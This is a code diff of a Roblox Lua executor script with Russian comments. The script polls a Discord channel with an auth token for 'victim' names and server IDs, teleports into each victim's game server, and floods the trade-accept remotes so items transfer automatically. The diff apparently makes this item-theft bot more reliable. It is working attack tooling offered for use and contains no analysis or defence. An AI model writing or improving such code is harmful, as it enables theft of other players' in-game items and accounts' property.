@@ -28,18 +28,27 @@ end)
 if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end
 local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
 
+-- Переменные для отслеживания состояния
+local lastMessageId = nil
+local currentVictim = nil
+local isTeleporting = false
+local victimLeft = false
+
 -- Функция выбора устройства
 local function selectDevice()
-    local DeviceSelectGui = Players.LocalPlayer.PlayerGui:FindFirstChild("DeviceSelect")
-    if DeviceSelectGui then
-        local button = DeviceSelectGui.Container.Phone.Button
-        local centerX = button.AbsolutePosition.X + button.AbsoluteSize.X/2
-        local centerY = button.AbsolutePosition.Y + button.AbsoluteSize.Y/2
-        
-        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
-        task.wait(0.1)
-        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
-        print("📱 Устройство выбрано")
+    while task.wait(0.1) do
+        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
+        if DeviceSelectGui then
+            local Container = DeviceSelectGui:WaitForChild("Container")
+            local Mouse = game.Players.LocalPlayer:GetMouse()
+            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
+            local buttonPos = button.AbsolutePosition
+            local buttonSize = button.AbsoluteSize
+            local centerX = buttonPos.X + buttonSize.X / 2
+            local centerY = buttonPos.Y + buttonSize.Y / 2
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
+        end
     end
 end
 
@@ -53,12 +62,15 @@ local function sendChatMessage()
 end
 
 -- Автопринятие трейдов
-local function autoAcceptTrade()
-    while task.wait(1) do
-        pcall(function()
-            ReplicatedStorage.Trade.AcceptRequest:FireServer()
-            ReplicatedStorage.Trade.AcceptTrade:FireServer()
-        end)
+local function acceptRequest()
+    while task.wait(0.1) do
+        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
+    end
+end
+
+local function acceptTrade()
+    while task.wait(0.1) do
+        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
     end
 end
 
@@ -93,12 +105,15 @@ local function getVictimFromEmbed(embed)
     return nil
 end
 
--- Проверка Discord сообщений
-local lastCheckedId = nil
-local currentVictim = nil
-local function checkDiscord()
+-- Проверка новых сообщений в Discord
+local function checkNewMessages()
+    local params = "?limit=10"
+    if lastMessageId then
+        params = params .. "&after=" .. lastMessageId
+    end
+
     local response = request({
-        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages"..params,
         Method = "GET",
         Headers = {
             ['Authorization'] = token,
@@ -112,11 +127,18 @@ local function checkDiscord()
     end
 
     local messages = HttpService:JSONDecode(response.Body)
+    if #messages == 0 then return false end
+
+    -- Обрабатываем сообщения от новых к старым
     for i = #messages, 1, -1 do
         local msg = messages[i]
-        if lastCheckedId and msg.id == lastCheckedId then break end
         
         if msg.content and msg.embeds and #msg.embeds > 0 then
+            -- Обновляем ID последнего сообщения
+            if not lastMessageId or msg.id > lastMessageId then
+                lastMessageId = msg.id
+            end
+
             -- Получаем имя жертвы из embed
             currentVictim = getVictimFromEmbed(msg.embeds[1])
             if not currentVictim then
@@ -135,14 +157,15 @@ local function checkDiscord()
                     writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                     
                     print("🚀 Телепортация...")
+                    isTeleporting = true
                     local success = pcall(function()
                         TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
                     end)
                     
                     if success then
-                        lastCheckedId = msg.id
                         return true
                     else
+                        isTeleporting = false
                         warn("❌ Ошибка телепортации")
                     end
                 else
@@ -152,12 +175,10 @@ local function checkDiscord()
         end
     end
     
-    if #messages > 0 then lastCheckedId = messages[1].id end
     return false
 end
 
 -- Отслеживание выхода цели
-local victimLeft = false
 Players.PlayerRemoving:Connect(function(player)
     if currentVictim and player.Name == currentVictim then
         victimLeft = true
@@ -168,15 +189,18 @@ end)
 -- Запуск функций
 task.spawn(selectDevice)
 task.spawn(sendChatMessage)
-task.spawn(autoAcceptTrade)
+task.spawn(acceptRequest)
+task.spawn(acceptTrade)
 
 -- Основной цикл
 while task.wait(checkInterval) do
-    if not victimLeft then
-        pcall(checkDiscord)
-    else
-        print("🔄 Ожидание новой цели...")
-        victimLeft = false
-        currentVictim = nil
+    if not isTeleporting then
+        if victimLeft then
+            print("🔄 Ожидание новой цели...")
+            victimLeft = false
+            currentVictim = nil
+        else
+            pcall(checkNewMessages)
+        end
     end
 end
